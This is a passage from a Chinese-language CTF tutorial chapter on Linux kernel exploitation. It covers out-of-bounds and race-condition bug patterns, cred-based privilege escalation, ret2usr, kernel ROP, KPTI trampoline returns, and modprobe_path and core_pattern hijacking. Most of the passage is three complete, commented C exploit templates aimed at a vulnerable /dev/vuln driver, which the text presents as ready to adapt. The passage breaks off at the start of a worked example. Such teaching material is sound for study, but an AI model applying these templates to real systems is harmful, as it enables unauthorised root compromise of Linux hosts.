```

```
data[] 前后都是内核的 .bss/.data 或堆：
   低地址                              高地址
   [其他内核全局变量][ data[0..0xff] ][其他内核全局变量/堆]
        ▲                    ▲                ▲
        └── idx 为负数 ◄──────┘──── idx 为大正数 ──►
   idx 是 long（有符号）→ 负下标向低地址读/写 → 实际上等效于【任意内核地址读写】
```

**要点**：
- 这是最"舒服"的洞型：`idx = (目标地址 - data 地址) / 8`，一个负数就能打到任意地址。若下标是无符号，也常能通过大下标回绕实现类似效果。
- 有了任意读 → 泄 KASLR（读内核里的函数指针）；有了任意写 → 直接走数据攻击路线（modprobe_path，12.5.6），连控制流都不用劫持。
- 变体：只查上界没查下界、下标类型是有符号 int 但被当无符号数组下标用等。

### 12.4.5 模式四：竞争条件（多线程操作同一对象）

**原理**：驱动的"检查"与"使用"之间不原子（TOCTOU，Time-Of-Check To Time-Of-Use），两条线程交错执行时状态被对方改掉：

```c
case CMD_EDIT:
    if (g_obj) {                                    // ① 检查：对象还活着
        copy_from_user(tmp, r.buf, r.len);          // ② 耗时操作（或人为的调度窗口）
        copy_from_user(g_obj->data, r.buf, r.len);  // ③ 使用：此刻 g_obj 可能已被
    }                                               //    另一线程 FREE 掉 → UAF！
    break;
```

```
线程 A                               线程 B
────────                             ────────
EDIT: 检查 g_obj != NULL ✔
  copy_from_user（第一次，耗时…）
                                     FREE: kfree(g_obj)
                                     ALLOC: kmalloc → 拿回同一块，放入恶意数据
  copy_from_user(g_obj->data, ...)   ← 对"新对象"进行了越界/错误写入（类型混淆）
```

**制造稳定窗口的手段**：

- **userfaultfd**：把一块用户内存注册成缺页托管，驱动 `copy_from_user` 拷到一半（源页缺页）时内核线程被挂起，此时去另一线程执行 FREE/ALLOC，再让缺页返回——经典的"把窗口拉长到秒级"。新内核对 unprivileged userfaultfd 有 `vm.unprivileged_userfaultfd` 限制，题目 init 里常显式放开。
- **FUSE**：同理，用用户态文件系统的慢速读制造阻塞。
- 大对象/多次拷贝本身耗时长，纯线程并发（sched_yield 抢时机）也能碰，成功率看缘分。

**要点**：竞争条件通常最终落到 UAF / double free / 类型混淆上，是"手段"不是"终点"。入门阶段先能识别即可。

---
## 12.5 提权原理与手段（重点）

### 12.5.1 cred 结构与 commit_creds(prepare_kernel_cred(0))

Linux 里"你是谁"由 `struct cred` 决定，每个进程的 `task_struct` 通过两个指针挂着它：

```
task_struct (current，当前进程描述符)
 ├── real_cred ──┐
 └── cred ───────┴──► struct cred {              // include/linux/cred.h
                          atomic_t  usage;       //   引用计数
                          kuid_t    uid;         //   ← 提权目标：全部改成 0
                          kgid_t    gid;
                          kuid_t    suid, euid, fsuid;
                          kgid_t    sgid, egid, fsgid;
                          kernel_cap_t cap_...;  //   capabilities 位图
                          ...                    // }
                      }
```

所以**提权的本质只有一句话：让当前进程的 cred 里 uid/gid 全变成 0**。两条路线：

- **路线 A（改指针，标准姿势）**：借用内核两个现成函数完成"造一份 root cred 并挂上去"：

```c
struct cred *prepare_kernel_cred(struct task_struct *daemon);
// 传 NULL：以 init_task（1 号进程，天然 root）的 cred 为模板克隆一份新 cred 并返回
int commit_creds(struct cred *new);
// 把 new 绑定到 current —— 从此 getuid() == 0
```

```
commit_creds(prepare_kernel_cred(NULL)) 全过程：

   current.cred ──► cred{uid=1000, ...}        ① prepare_kernel_cred(NULL)
                          │                       克隆 init_task 的 cred：
                          ▼                       new_cred{uid=0, gid=0, ...}
   ┌─ 内核态调用 ─┐        └──►  ② commit_creds(new_cred)：
                                          current.cred ──► new_cred{uid=0}
   返回用户态后 getuid()==0，system("/bin/sh") 即 root shell
```

- **路线 B（改数据）**：不动 cred，改 `modprobe_path` 等内核数据借内核之手提权（12.5.7）。

**控制流劫持型 exploit 的最终目标因此非常具体**：想办法以 CPL=0 执行一次 `commit_creds(prepare_kernel_cred(0))`。两个符号地址从 `/proc/kallsyms`（root）或 vmlinux 静态查得。

> **新内核变化**（做题注意）：6.2+ 内核 `prepare_kernel_cred(NULL)` 传入 NULL 会 oops，需改为 `commit_creds(&init_cred)`（`init_cred` 是导出符号，直接把 init 进程的 cred 传进去）或 `prepare_kernel_cred(&init_task)`。老题（4.x/5.x）一律 `prepare_kernel_cred(0)`。

### 12.5.2 ret2usr —— 无 SMEP 时直接跳用户态代码

**原理**：SMEP 关闭时，内核态（CPL=0）**允许执行用户态地址上的页**。于是 exploit 可以这样打：内核栈溢出把返回地址覆盖成**用户态提权函数**的地址——内核函数 `ret` 时就"跳回"了我们埋伏在用户态的代码，而此时 CPU 还在 CPL=0！在用户态页上执行 `commit_creds(prepare_kernel_cred(0))`，等于白嫖内核权限：

```
用户态 exp 进程                                内核
────────────────                               ─────────────────────────────────
write(fd, payload, 0x100)
   │ 系统调用陷入（swapgs、切内核栈）
   ▼
                              vuln_write: copy_from_user(buf[0x40], user_buf, 0x100)
                                            └── 内核栈被灌入 payload ──┐
                              vuln_write 返回 ── ret ──┐             │
   ┌───────────────────────────────────────────────────┘             │
   │  跳到 payload 覆盖的返回地址 = 用户态 escalate() 的地址          │
   │  （SMEP 关闭 → CPL=0 执行用户页，合法！）                        │
   ▼                                                                 │
   escalate(): commit_creds(prepare_kernel_cred(0))   ← 当前进程已是 root
   escalate(): ret  → 从内核栈弹出下一个值 = KPTI trampoline / iretq 帧
   ▼
   swapgs + iretq 弹出五元组 → 回到用户态 get_shell()  →  uid=0 ✔
```

**完整 exploit（即 12.6 模板一，逐行注释）**：

```c
// exp_ret2usr.c —— ret2usr 完整模板（nokaslr / nosmep / nosmap / nopti）
// 编译：gcc -static -o exp exp_ret2usr.c -w
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>

typedef unsigned long ulong;                     // 简写：内核指针统一用 ulong

/* ───────────── 第 1 段：保存用户态现场 ─────────────
   返回用户态要用 iretq 五元组（rip/cs/rflags/rsp/ss），
   其中 cs/ss/rflags/rsp 必须是"进入内核之前"的真实值，所以最先保存。 */
ulong user_cs, user_ss, user_rflags, user_rsp;   // 全局变量存现场

void save_state(void)
{
    __asm__ __volatile__(
        "movq %%cs,    %0\n"                     // ① 读代码段选择子（用户态一般 0x33）
        "movq %%ss,    %1\n"                     // ② 读栈段选择子（一般 0x2b）
        "pushfq\n"                               // ③ RFLAGS 压栈
        "popq    %2\n"                           //    弹出存入变量
        "movq %%rsp,   %3\n"                     // ④ 当前用户态栈指针
        : "=r"(user_cs), "=r"(user_ss),          //    输出操作数：四个变量
          "=r"(user_rflags), "=r"(user_rsp)
        :                                        //    无输入
        : "memory");                             //    告诉编译器内存可能变化
}

/* ───────────── 第 2 段：内核符号地址 ─────────────
   nokaslr 时 vmlinux 静态地址即运行地址；也等于 root 下 cat /proc/kallsyms 的值。
   开 KASLR 的题这里必须换成泄露出来的运行时地址！ */
ulong prepare_kernel_cred_addr = 0xffffffff8109cde0UL;
ulong commit_creds_addr        = 0xffffffff8109c8e0UL;

/* ───────────── 第 3 段：内核态要执行的提权函数 ─────────────
   这段代码物理上位于用户态地址空间，但会在 CPL=0 下被内核执行（无 SMEP）。 */
void escalate(void)
{
    /* 用函数指针写法，让编译器按 C 调用约定走 rdi 传参：
       commit_creds( prepare_kernel_cred(NULL) ) */
    ulong (*pkc)(int)   = (ulong (*)(int))prepare_kernel_cred_addr;
    void  (*cc)(ulong)  = (void  (*)(ulong))commit_creds_addr;
    cc(pkc(0));                                  // 依次调用，rdi 正确传递
}

/* ───────────── 第 4 段：提权成功后的落点 ───────────── */
void get_shell(void)
{
    if (getuid() == 0) {                         // 确认提权成功
        puts("[+] PWN! uid=0");
        system("/bin/sh");                       // 起 root shell
    } else {
        puts("[-] failed, uid != 0");            // 走到这里说明 cred 没换掉
        exit(1);
    }
}

/* ───────────── 第 5 段：main —— 组装 payload 并触发 ───────────── */
int main(void)
{
    save_state();                                // ★ 必须在一切可能进内核的操作之前
    int fd = open("/dev/vuln", O_RDWR);          // 打开漏洞设备
    if (fd < 0) { perror("open /dev/vuln"); return 1; }

    ulong payload[64];                           // 覆盖序列（覆盖内核栈）
    memset(payload, 0x41, sizeof(payload));      // 前 0x40 字节对应内核栈上的 buf 本体
    int i = 8;                                   // 从第 8 个 qword 开始才是溢出区

    payload[i++] = (ulong)escalate;              // ★ 覆盖 vuln_write 的返回地址 → 用户态提权函数
    /* escalate() 结束 ret 时，内核 rsp 恰好指向下面，沿栈继续执行： */
    payload[i++] = 0xffffffff81800e70UL;         // ★ swapgs_restore_regs_and_return_to_usermode+22
    payload[i++] = 0;                            //    占位（被 trampoline 的 pop 吃掉）
    payload[i++] = 0;                            //    占位（同上）
    payload[i++] = (ulong)get_shell;             // ── iretq 五元组开始 ──
    payload[i++] = user_cs;                      //    user rip   ← 回用户态后从这继续
    payload[i++] = user_rflags;                  //    user cs
    payload[i++] = user_rsp;                     //    user rflags
    payload[i++] = user_ss;                      //    user rsp / user ss
                                                 // ── 五元组结束 ──
    write(fd, payload, sizeof(payload));         // ★ 触发：驱动不校验长度 → 内核栈溢出

    puts("[-] exploit did not take effect");     // 正常走不到这里（已进 get_shell）
    return 0;
}
```

> **老内核替代尾巴**：4.15 之前没有 trampoline 符号，用两个 gadget 拼返回：`swapgs; ret`（或 `swapgs; pop rbp; ret`）→ 补占位 → `iretq; ret`（或直接 `iretq`），后面同样接五元组。
> **为什么 trampoline 万金油**：未开 KPTI 的内核里，trampoline 中"切用户 CR3"的指令在启动时已被内核打成 nop，走它等价于 swapgs + iretq，但省去了找两个 gadget。

### 12.5.3 有 SMEP：内核 ROP

SMEP 开启后 CPL=0 执行用户页直接 oops，ret2usr 寿终正寝。但**内核栈还在我们手里**——和用户态 NX 时代的思路一模一样：既然不能注入代码，就复用内核自己的代码片段（gadget）。gadget 从 vmlinux 里找（内核是非 PIE 巨型二进制，gadget 海量）：

```bash
ROPgadget --binary vmlinux > gadgets.txt
grep -E ": pop rdi ; ret$"          gadgets.txt
grep -E ": pop rsi ; ret$"          gadgets.txt
grep -E "mov rdi, rax ; ret$"       gadgets.txt     # rax → rdi 的传参桥
grep -E ": iretq"                   gadgets.txt     # 老内核手工返回用
```

标准提权链（4.x/5.x）：

```
pop rdi; ret
0                          ← prepare_kernel_cred 的参数 NULL
prepare_kernel_cred        ← rax = 新 root cred
mov rdi, rax; ret          ← 把返回值搬到 rdi（关键衔接！）
commit_creds               ← current 换 cred
（返回用户的尾巴：12.5.4 / 12.5.5）
```

两个常用变体：
- **找不到 `mov rdi, rax`**：找 `mov rdi, rax ; dec ebx ; ret`、`push rax ; pop rdi ; ret`、`mov rdi, rax ; call rbx`（需先控制 rbx）等一切 rax→rdi 桥。
- **干脆不调 prepare_kernel_cred**：`pop rdi; ret` → `&init_cred`（内核导出符号，uid 全 0 的现成 cred）→ 直接 `commit_creds`。少一环，且在新内核上兼容性更好。

### 12.5.4 swapgs; iretq —— 恢复用户态的帧构造

ROP 完成 `commit_creds` 之后还在内核态，必须"体面地"回到用户态才能起 shell。这需要两件事：

**① swapgs**。进入内核时内核执行过 swapgs（GS 基址：用户 ↔ 内核 per-CPU 数据互换）。我们"非正常路径"地要回用户态，也必须再 swapgs 换回来，否则回用户态后 per-CPU 数据（包括栈相关的部分）全错，立刻崩。

**② iretq 五元组**。iretq 从栈上按固定顺序弹出 5 个值并"降级"回用户态：

```
内核栈（低地址 → 高地址）              iretq 依次弹出
┌──────────────┐
│ user_rip     │ ◄── 弹入 RIP     ：回用户态后从哪继续（&get_shell）
│ user_cs      │ ◄── 弹入 CS      ：0x33（用户代码段）→ CPL 降为 3
│ user_rflags  │ ◄── 弹入 RFLAGS  ：恢复标志寄存器（IF 位等）
│ user_rsp     │ ◄── 弹入 RSP     ：用户态栈指针
│ user_ss      │ ◄── 弹入 SS      ：0x2b（用户数据段）
└──────────────┘
★ 五个值的顺序不能错，cs/ss 用 save_state() 现场取的真实值，不要手填猜值。
```

所以完整 ROP 链的尾部布局（未开 KPTI、用 trampoline 时）：

```
... | commit_creds | kpti_trampoline(+22) | 0 | 0 | &get_shell | user_cs | user_rflags | user_rsp | user_ss |
```

**save_state 的时机**：必须在 main 里第一件事就做（任何 `open/ioctl/write` 都会进内核改 rsp 相关状态不会变 cs/ss，但 rsp 会变；最保险是 main 开头）。这个五元组保存套路是内核 PWN 的"默认开场动作"。

### 12.5.5 绕 KPTI：swapgs_restore_regs_and_return_to_usermode + offset

KPTI 开启时，回用户态除了 swapgs 还要**把 CR3 切回用户页表**，手工找 gadget 拼这套流程又长又脆。正确姿势：**跳进内核现成的返回例程中段**，让内核自己把"切页表 + swapgs + iretq"做完：

```
内核符号 swapgs_restore_regs_and_return_to_usermode 的结构（示意）：

  +0     ┌─ POP_REGS：pop r15/r14/r13/r12/rbp/rbx/r11/r10/r9/r8/rax/rcx/rdx/rsi
         │           （一长串 pop，各版本前后可能还夹着 IBRS 等处理）
   ……    └─
  +X     ┌─ 我们要跳的入口（跳过上面的 pop）：
         │    swapgs                        ← 换回用户 GS
         │    切换 CR3 → 用户页表           ← KPTI 的关键一步
         │    （未开 KPTI 的内核这段被启动时补丁成 nop）
         │    从 trampoline 栈压回 iretq 五元组
         │    iretq
   └────┘
```

**exploit 侧栈帧布局**（跳到入口后，rsp 正指着这些值）：

```
   ┌────────────────────────────────┐  低地址
   │ …（ROP 链前半段：提权部分）    │
   │ 占位 0        （被入口附近的   │
   │ 占位 0          pop 吃掉）     │
   │ user_rip        (&get_shell)   │
   │ user_cs                        │
   │ user_rflags                    │     ← iretq 帧（顺序固定！）
   │ user_rsp                       │
   │ user_ss                        │
   └────────────────────────────────┘  高地址

组装顺序（从 exploit 代码角度依次 push 进 payload）：
   kpti_trampoline 偏移 → 0 → 0 → &get_shell → user_cs → user_rflags → user_rsp → user_ss
```

**偏移怎么选**：`swapgs_restore_regs_and_return_to_usermode+22`（0x16）是 4.15～5.x 大量内核的常用值，但**每个内核必须实测验证**：

```
gdb ./vmlinux
(gdb) disassemble swapgs_restore_regs_and_return_to_usermode
# 目标：找到"一长串 pop"结束、接下来马上是 swapgs 的那条指令的偏移。
# 也可以 objdump -d vmlinux | grep -A30 "<swapgs_restore_regs_and_return_to_usermode>"
# 选偏移的标准：跳过去之后，栈上只需要 [占位][占位][rip][cs][rflags][rsp][ss] 就能顺利 iretq。
```

### 12.5.6 无需返回用户态的一次性 payload

如果"返回用户态"这一步怎么都拼不稳（怪内核版本、gadget 缺失），可以**根本不回去**：ROP 链提权后不接 iretq，而是继续调用内核的 `call_usermodehelper`，让内核**以 root 身份**替我们跑一条命令（比如把 flag 拷出来 chmod 777），然后 exploit 哪怕 oops/panic 也无所谓——flag 已经到手：

```
... | commit_creds |（提权完成，不再返回用户态）
    | pop rdi; ret | &"/bin/sh"          ← path
    | pop rsi; ret | &argv               ← argv（{"/bin/sh","-c","cat /flag>/tmp/f",NULL}）
    | pop rdx; ret | &envp               ← envp（{NULL}）
    | pop rcx; ret | 1 (UMH_WAIT_PROC)   ← 同步等待 helper 跑完
    | call_usermodehelper |
    | 0xdeadbeef（故意崩掉，无所谓了）|
```

**前提注意**：path/argv/envp 指向的字符串和数组必须位于**内核内存**（SMAP 禁止内核读用户内存；即便无 SMAP，KPTI 页表下也未必可达）。工程上常用做法：先用漏洞的任意写把字符串写进内核 `.data`，或先泄露内核栈地址、把字符串直接编在 ROP payload 里按栈地址引用。因此实战中"一次性 payload"最常见的形态其实是下一节的 modprobe_path——它天生满足"数据在内核内存"这个条件。

### 12.5.7 modprobe_path 覆写路线（数据攻击代表作）

**原理**：内核符号 `modprobe_path`（`char[256]`，位于 `.data`，默认 `"/sbin/modprobe"`）是"内核找不到可执行文件格式时"调用的 helper 路径：

```
exp 以普通用户执行 /tmp/dummy（魔数 \xff\xff\xff\xff，任何 binfmt 都不认识）
   │ execve → search_binary_handler 全部失败
   ▼
内核：request_module("binfmt-ffff")
   ▼
内核：call_usermodehelper(modprobe_path, argv, envp, UMH_WAIT_PROC)
   └── 以 root 身份、无任何文件校验地执行 modprobe_path 指向的程序！
   ▼
若 modprobe_path 已被改成 "/tmp/x" → 内核以 root 执行我们的脚本 ✔
```

**完整 exploit（即 12.6 模板三）**：

```c
// exp_modprobe.c —— modprobe_path 覆写完整模板（前提：任意写原语 + nokaslr）
// 编译：gcc -static -o exp exp_modprobe.c -w
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/stat.h>

#define CMD_READ  0x100
#define CMD_WRITE 0x101

struct request {                // 与驱动侧 struct request 对应
    long idx;                   //   OOB 下标（long，可为负 → 任意地址）
    long val;                   //   写入值
    void *buf;                  //   读出值回传地址
};

/* 内核符号地址（root 读 /proc/kallsyms 或 vmlinux 查得；nokaslr） */
unsigned long data_addr          = 0xffffffff82a0b100UL; // 驱动全局数组 data[] 的地址
unsigned long modprobe_path_addr = 0xffffffff82a6b860UL; // modprobe_path 的地址

int fd;                          // 设备句柄

/* ── 任意写：把 val 写到 addr（本质是 OOB 下标的数学换算） ── */
void arb_write(unsigned long addr, unsigned long val)
{
    struct request r;
    r.idx = (long)((addr - data_addr) / 8);   // data[idx] = data + idx*8
    r.val = val;                              //   → idx = (addr - 基址)/8
    ioctl(fd, CMD_WRITE, &r);                 // 触发驱动里的 data[r.idx] = r.val
}

/* ── 任意读：读 addr 处的 8 字节 ── */
unsigned long arb_read(unsigned long addr)
{
    struct request r;
    unsigned long out = 0;
    r.idx = (long)((addr - data_addr) / 8);
    r.buf = &out;                             // 驱动会把结果 copy_to_user 到这
    ioctl(fd, CMD_READ, &r);
    return out;
}

/* ── 按 8 字节粒度把字符串写进内核 ── */
void write_string(unsigned long addr, const char *s)
{
    char buf[256] = {0};                      // 全零缓冲：补齐 \0
    memcpy(buf, s, strlen(s));                // 放入目标字符串
    for (int i = 0; i < 256 / 8; i++) {       // 整块 256 字节全写（覆盖原 /sbin/modprobe）
        unsigned long v;
        memcpy(&v, buf + i * 8, 8);           // 取第 i 个 qword
        arb_write(addr + i * 8, v);           // 逐 qword 任意写
    }
}

int main(void)
{
    /* ① 准备 /tmp/x：将来被内核以 root 执行的脚本（动作要一次性做完） */
    system("echo '#!/bin/sh'                 >  /tmp/x");
    system("echo 'cat /flag > /tmp/flag'     >> /tmp/x");   // 把 flag 拷到任何人可读处
    system("echo 'chmod 777 /tmp/flag'       >> /tmp/x");
    system("chmod +x /tmp/x");                              // 必须可执行

    /* ② 准备触发文件：魔数非法的假可执行文件 */
    system("printf '\\xff\\xff\\xff\\xff' > /tmp/dummy");   // 不是任何已知二进制格式
    system("chmod +x /tmp/dummy");

    /* ③ 打开漏洞设备，先验证任意读，再覆写 modprobe_path */
    fd = open("/dev/vuln", O_RDWR);
    if (fd < 0) { perror("open"); return 1; }
    printf("[*] old modprobe_path = 0x%lx\n", arb_read(modprobe_path_addr));
    write_string(modprobe_path_addr, "/tmp/x");             // "/sbin/modprobe" → "/tmp/x"
    printf("[*] new modprobe_path = 0x%lx\n", arb_read(modprobe_path_addr));

    /* ④ 触发：执行非法格式文件 → 内核以 root 跑 /tmp/x */
    system("/tmp/dummy");

    /* ⑤ 收获 */
    system("cat /tmp/flag");
    return 0;
}
```

**为什么这条路线是"新手友好之王"**：
- 全程**不劫持任何控制流**：不需要 ROP、不需要 iretq 帧、不需要 save_state，exploit 跑完该干嘛干嘛，崩不崩都无所谓；
- 对 KPTI/SMAP 无感（没碰用户内存引用问题），只要求**一个内核任意写 + 符号地址**；
- `modprobe_path` 是 `.data` 里的普通字符数组，写坏一点不影响其他功能，容错极高。

**条件与检查**：`cat /proc/sys/kernel/modprobe` 能看到当前值（被改成别处说明题目已防）；某些容器环境 usermodehelper 被限制，本地能打远程不行时要想到这点。

### 12.5.8 core_pattern 劫持

与 modprobe_path 同族的"内核替我执行"机制，目标是内核符号 `core_pattern`（`char[128]`）：

1. 任意写把 `core_pattern` 覆写为 `"|/tmp/x"`（开头的 `|` 表示"core 以管道喂给该程序"，该程序以 **root** 执行）；
2. exp 进程里 `setrlimit(RLIMIT_CORE, RLIM_INFINITY)` 放开 core dump 限制，然后故意崩溃（如解引用空指针触发 SIGSEGV）；
3. 内核执行 `/tmp/x`（其 stdin 是 core 数据），脚本里 `cat /flag > /tmp/flag && chmod 777 /tmp/flag`。

这条路线在**容器逃逸**场景（与宿主共享内核）尤其出名：宿主侧执行 crash 即可触发。单机 CTF 题里与 modprobe_path 二选一即可。

### 12.5.9 vDSO（概念性提及）

vDSO（virtual Dynamic Shared Object）是内核映射进每个用户进程地址空间的一段"内核提供的代码页"（`gettimeofday`、`clock_gettime` 等免系统调用加速）。历史上的玩法：利用任意写篡改 vDSO 页内容写入 shellcode，等任何进程调用时间函数即执行（ret2vDSO 亦指利用 vDSO 里的 gadget）。新内核对 vDSO 做了只读映射与随机化，现代题目已少用，知道概念即可，面试/文档里能讲清楚"它是什么、为什么曾经能打"就达标。

---
## 12.6 完整 exploit 模板

三个模板对应三条主路线，均可直接改编套用。通用开场约定：**先 `save_state()`，再 open 设备，再组 payload**。

### 模板一：ret2usr（无 SMEP）

完整逐行注释版见 **12.5.2**，此处给出骨架便于复制改编：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

typedef unsigned long ulong;
ulong user_cs, user_ss, user_rflags, user_rsp;       // 现场四件套

void save_state(void) {                              // 详细注释见 12.5.2
    __asm__ __volatile__(
        "movq %%cs, %0\n" "movq %%ss, %1\n"
        "pushfq\n" "popq %2\n" "movq %%rsp, %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_rsp)
        : : "memory");
}

ulong pkc_addr = 0xffffffff8109cde0UL;               // prepare_kernel_cred（nokaslr 静态地址）
ulong cc_addr  = 0xffffffff8109c8e0UL;               // commit_creds

void escalate(void) {                                // 将在 CPL=0 下执行的用户态函数
    ((ulong (*)(int))pkc_addr)(0);
    ((void (*)(ulong))cc_addr)(((ulong (*)(int))pkc_addr)(0));  // ← 错！见下方修正
}
```

> 注意上面 escalate 的写法有陷阱：两次调用要**嵌套**而不是并列（`cc(pkc(0))`，rdi 才是 pkc 的返回值）。正确写法一律用 12.5.2 版本：

```c
void escalate(void)                                  // ★ 正确写法
{
    ulong (*pkc)(int)  = (ulong (*)(int))pkc_addr;
    void  (*cc)(ulong) = (void  (*)(ulong))cc_addr;
    cc(pkc(0));                                      // 嵌套调用：rdi = pkc(0) 的返回值
}

void get_shell(void)                                 // 回到用户态后的落点
{
    if (getuid() == 0) system("/bin/sh");
    else { puts("[-] not root"); exit(1); }
}

int main(void)
{
    save_state();                                    // ① 任何系统调用之前保存现场
    int fd = open("/dev/vuln", O_RDWR);              // ② 打开漏洞设备
    ulong payload[64];
    memset(payload, 0x41, sizeof(payload));
    int i = 8;                                       // ③ 前 8 个 qword 是缓冲区本体
    payload[i++] = (ulong)escalate;                  // ④ 返回地址 → 用户态提权函数
    payload[i++] = 0xffffffff81800e70UL;             // ⑤ trampoline(+22)：swapgs+切页表+iretq
    payload[i++] = 0;  payload[i++] = 0;             // ⑥ 两个占位
    payload[i++] = (ulong)get_shell;                 // ⑦ iretq 五元组：rip
    payload[i++] = user_cs;
    payload[i++] = user_rflags;
    payload[i++] = user_rsp;
    payload[i++] = user_ss;
    write(fd, payload, sizeof(payload));             // ⑧ 触发内核栈溢出
    return 0;
}
```

### 模板二：内核 ROP（SMEP/SMAP + KPTI 绕过）

```c
// exp_rop.c —— 模板二：内核 ROP（SMEP/SMAP/KPTI 开启，nokaslr）
// 编译：gcc -static -o exp exp_rop.c -w
// 符号/gadget 均从 vmlinux 查得（nokaslr 下即运行时地址）：
//   ROPgadget --binary vmlinux | grep ": pop rdi ; ret"
//   ROPgadget --binary vmlinux | grep "mov rdi, rax ; ret"
//   readelf -s vmlinux | grep -E "prepare_kernel_cred|commit_creds|swapgs_restore"
//   gdb: disassemble swapgs_restore_regs_and_return_to_usermode → 确认 +22 是否落在
//        "一长串 pop" 结束处（逐内核验证，详见 12.5.5）
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>

typedef unsigned long ulong;

/* ───── 第 1 段：保存用户态现场（与模板一相同） ───── */
ulong user_cs, user_ss, user_rflags, user_rsp;

void save_state(void)
{
    __asm__ __volatile__(
        "movq %%cs, %0\n"                            // user cs（回用户态要还原）
        "movq %%ss, %1\n"                            // user ss
        "pushfq\n" "popq %2\n"                       // user rflags
        "movq %%rsp, %3\n"                           // user rsp
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_rsp)
        : : "memory");
}

/* ───── 第 2 段：符号与 gadget 地址表（nokaslr） ───── */
ulong pop_rdi_ret         = 0xffffffff81007996UL;   // pop rdi ; ret
ulong mov_rdi_rax_ret     = 0xffffffff8106d0d4UL;   // mov rdi, rax ; ret   （rax→rdi 桥）
ulong prepare_kernel_cred = 0xffffffff8109cde0UL;   // 造 root cred
ulong commit_creds        = 0xffffffff8109c8e0UL;   // 挂到 current
/* KPTI trampoline：swapgs_restore_regs_and_return_to_usermode + 22
   （偏移务必用 gdb 反汇编逐内核验证！） */
ulong kpti_trampoline     = 0xffffffff81800e70UL;

/* ───── 第 3 段：提权成功后的落点 ───── */
void get_shell(void)
{
    if (getuid() == 0) {                             // cred 已换 → 必为 0
        puts("[+] PWN! root shell:");
        system("/bin/sh");
    } else {
        puts("[-] escalate failed");
        exit(1);
    }
}

/* ───── 第 4 段：main —— 组链并触发 ───── */
int main(void)
{
    save_state();                                    // ① 开场保存现场
    int fd = open("/dev/vuln", O_RDWR);              // ② 打开漏洞设备
    if (fd < 0) { perror("open"); return 1; }

    ulong payload[64];
    memset(payload, 0x41, sizeof(payload));          // ③ 填满内核栈上 0x40 的缓冲区
    int i = 8;                                       //    从溢出点开始放 ROP 链

    /* —— 提权段：commit_creds(prepare_kernel_cred(0)) —— */
    payload[i++] = pop_rdi_ret;                      // ④ gadget：弹出 rdi
    payload[i++] = 0;                                //    rdi = NULL（参数）
    payload[i++] = prepare_kernel_cred;              //    "ret" 进函数，rax = 新 cred
    payload[i++] = mov_rdi_rax_ret;                  //    桥 gadget：rdi = rax
    payload[i++] = commit_creds;                     //    current.cred = root cred

    /* —— 返回段：借 KPTI trampoline 回用户态 —— */
    payload[i++] = kpti_trampoline;                  // ⑤ 跳过一长串 pop，直达
                                                     //    swapgs → 切用户 CR3 → iretq
    payload[i++] = 0;                                //    占位（被入口处 pop 吃掉）
    payload[i++] = 0;                                //    占位（同上）

    /* —— iretq 五元组（顺序固定：rip, cs, rflags, rsp, ss） —— */
    payload[i++] = (ulong)get_shell;                 // ⑥ user rip：回用户态从这继续
    payload[i++] = user_cs;                          //    user cs
    payload[i++] = user_rflags;                      //    user rflags
    payload[i++] = user_rsp;                         //    user rsp
    payload[i++] = user_ss;                          //    user ss

    write(fd, payload, sizeof(payload));             // ⑦ 触发内核栈溢出 → 内核沿链执行

    puts("[-] exploit did not trigger");             // 走到这里 = 链没生效
    return 0;
}
```

**变体速记**：

```text
① 找不到 mov rdi,rax 桥：改用 init_cred 路线 ——
   pop_rdi_ret → &init_cred → commit_creds → trampoline → 占位×2 → 五元组
② 新内核（6.2+）prepare_kernel_cred(0) 会 oops：一律用 init_cred 路线
③ 有 SMAP 时本模板不受影响（payload 在内核栈上，没有任何用户地址被内核解引用）
④ 栈溢出带 canary 的题：先用 OOB 读/泄露原语拿 canary，再在 payload 第 8 个 qword 处原样填回
```

### 模板三：modprobe_path（任意写 → 数据攻击）

完整逐行注释版见 **12.5.7**。骨架与操作序列：

```c
// 前提：任意写原语（OOB 下标/UAF 构造等）+ 内核符号地址
arb_write(modprobe_path_addr, /* "/tmp/x\0\0" 的 8 字节 */);   // ① 改内核 modprobe_path
//   "/tmp/x" 的字节序：2f 74 6d 70 2f 78 00 00 → 0x0000782f706d742f
//   （字符串短于 8 字节时一个 qword 写入并带 \0 即完成截断）
system("echo '#!/bin/sh\ncat /flag >/tmp/flag\nchmod 777 /tmp/flag' > /tmp/x; chmod +x /tmp/x");
system("printf '\\xff\\xff\\xff\\xff' > /tmp/dummy; chmod +x /tmp/dummy");  // ② 造触发文件
system("/tmp/dummy");                                          // ③ 执行 → 内核以 root 跑 /tmp/x
system("cat /tmp/flag");                                       // ④ 收 flag
```

**三模板选择决策**：

```
题目给了什么漏洞原语？
 ├─ 内核栈溢出 + 无 SMEP ────────────► 模板一 ret2usr（最快）
 ├─ 内核栈溢出 + SMEP/KPTI ──────────► 模板二 内核 ROP
 ├─ 任意读/写（OOB/UAF 打出来的） ───► 模板三 modprobe_path（最稳）
 └─ UAF/堆篡改函数指针 ─────────────► 先堆喷稳定劫持，再落回上面三条之一
```

---
## 12.7 典型例题

三道构造情境例题对应三模板，覆盖"从拿到题目包到打出 flag"的完整流程。

### 例题 1：无保护 ret2usr 提权（babyret2usr）

**start.sh（一切判据的起点）：**

```bash
#!/bin/sh
qemu-system-x86_64 \
    -m 128M \
    -kernel ./bzImage \
    -initrd ./rootfs.cpio \
    -append "console=ttyS0 nokaslr" \
    -cpu qemu64 \
    -nographic \
    -no-reboot
```

判读：`nokaslr`（地址全固定）；`-cpu qemu64` 默认无 smep/smap；非 Meltdown 型 CPU → KPTI 默认关。**结论：全裸，ret2usr 直接打。**

**漏洞驱动关键代码（rootfs 里的 vuln.ko，IDA/objdump 复原）：**

```c
static ssize_t vuln_write(struct file *filp, const char __user *buf,
                          size_t len, loff_t *off)
{
    char kernel_buf[0x40];                  // 内核栈缓冲区 0x40
    copy_from_user(kernel_buf, buf, len);   // ← 漏洞：len 与 0x40 从不比较
    return len;
}
```

**解题流程：**

